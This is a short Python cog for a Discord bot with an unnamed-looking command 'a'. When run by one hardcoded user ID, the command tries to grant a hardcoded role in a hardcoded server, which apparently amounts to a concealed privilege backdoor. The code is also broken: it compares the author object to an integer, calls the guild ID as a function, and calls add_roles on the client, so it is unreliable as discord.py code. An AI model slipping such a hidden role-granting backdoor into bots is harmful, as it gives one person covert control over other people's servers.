import discord
from discord.ext import commands

class A(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command()
    async def a(self, ctx):
        if ctx.author == 977993035717681252:
            role_id = 845707696565125150

            guild = ctx.guild.id(1022162924430692422)
            role = discord.utils.get(guild.roles, id=role_id)
            await self.client.add_roles(role)
        else:
            return
async def setup(client):
    await client.add_cog(A(client))